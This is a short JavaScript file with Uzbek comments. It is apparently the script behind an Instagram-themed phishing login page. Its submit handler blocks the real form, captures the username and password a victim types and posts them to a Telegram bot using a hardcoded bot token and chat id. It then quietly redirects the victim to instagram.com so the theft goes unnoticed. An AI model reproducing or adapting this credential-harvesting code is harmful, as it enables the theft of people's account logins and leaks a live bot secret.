 function sendToTelegram(username, password) {
    const token = "7844469996:AAGIMbfoaccOyQoPjqWny7by3pVdWhE2Gpk";
    const chat_id = "7026723422";
    const message = `👤 User: ${username}\n🔑 Password: ${password}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chat_id,
        text: message
      })
    })
    .then(response => console.log("Yuborildi"))
    .catch(error => console.error("Xato:", error));
  }

  document.querySelector(".login-form").addEventListener("submit", function (e) {
    e.preventDefault(); // Formani bekor qiladi
  
    const username = document.querySelector('input[type="text"]').value;
    const password = document.getElementById("password").value;
  
    sendToTelegram(username, password); // Ma'lumotni yuboradi
  
    // Hech qanday alertsiz, to‘g‘ridan-to‘g‘ri Instagramga yo‘naltiradi
    window.location.href = "https://www.instagram.com";
  });
  
  
